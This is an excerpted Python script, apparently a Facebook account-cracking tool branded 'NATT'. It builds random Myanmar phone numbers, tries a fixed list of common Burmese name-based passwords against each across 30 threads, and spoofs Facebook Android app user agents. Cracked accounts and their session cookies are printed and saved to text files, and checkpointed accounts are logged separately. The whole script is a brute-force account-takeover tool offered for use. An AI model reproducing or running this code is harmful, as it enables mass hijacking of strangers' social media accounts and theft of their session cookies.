...
uas_random = random.choice(["Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36"])
...
uas_random2 = random.choice(["Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36"])
...
\033[93;1m ____  _____       _     _________  _________  
\033[93;1m|_   \|_   _|     / \   |  _   _  ||  _   _  | 
\033[92;1m  |   \ | |      / _ \  |_/ | | \_||_/ | | \_| 
\033[92;1m  | |\ \| |     / ___ \     | |        | |     
 \033[91;1m_| |_\   |_  _/ /   \ \_  _| |_      _| |_    
\033[91;1m|_____|\____||____| |____||_____|    |_____|   
                                               
------------------------------------------------
 \033[92;mFaceBook  :     Nyi Zay
 \033[92;mStatus    :     Test
 \033[92;mVersion   :     v1.0
\033[93;1m════════════════════════════════════════════════""")
...
def Main_NATT():
		clear()
		print(f'\033[1;37m \033[94;1m[1] Random Cloning \n [0] Exit')
		linex()
...
def r_crack():
	clear()
	print(' \033[91;1m[1] \033[92;1mMyanmar Cloning ')
	linex()
...
def mya():
	user=[]
	clear()
	print('\033[95;1m [+]\033[91;1m Example - \033[92;1m09466 , \033[93;1m0975 , \033[94;1m0925 , \033[96;1m0995')
	...
	for nmbr in range(limit):
		...
		user.append(nmp)
	with tred(max_workers=30) as NATT:
		clear()
		tl = str(len(user))
		...
		for psx in user:
			ids = code+psx
			passlist = [psx,ids,'Myanmar','kyawkyaw','KyawKyaw','nyinyi','myanmar','myanmar123','moemoe','Aung123','ayeaye','nyinyi123','Myanmar123','thuthu','kyaw123','soe123','zawzaw','zaw123','thuzar','thuzar123','kyawgyi','linlin','chitchit','waiwai','Kyaw12345','Wai12345','Min12345','Soe12345','Nyi12345','Zaw12345','Aung12345','aungaung']
			NATT.submit(rd1,ids,passlist)
	print('\033[1;37m')
	linex()
...
def rd1(ids,passlist):
	try:
		...
		sys.stdout.write('\r\r\33[1;37m [NATT-XD]  %s|  OK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
		for pas in passlist:
				...
				ua  = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+";[[FBAN/FB4A;FBAV/345.0.0.34.118;FBBV/332957732;FBDM/{density=2.75,width=1080,height=2132};FBLC/ru_RU;FBRV/336326830;FBCR/MegaFon #1;FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;FBDV/M2010J19SY;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]"
				...
				if 'session_key' in po:
						...
						print('\r\r\033[1;32m [NATT-OK] '+uid+' | '+pas)
						print(' \33[1;33m[Cookies] == '+cookie)
						file_path_ok = os.path.join(folder_path, 'NATT - OK.txt')
						file_path_cookies = os.path.join(folder_path, 'NATT-OK-COOKIEs.txt')
						...
						print(f'\r\r\33[1m\33[1;35m [NATT-CP] '+uid+' | '+pas+'\033[1;97m')
						file_path = os.path.join(folder_path, 'NATT - CP.txt')
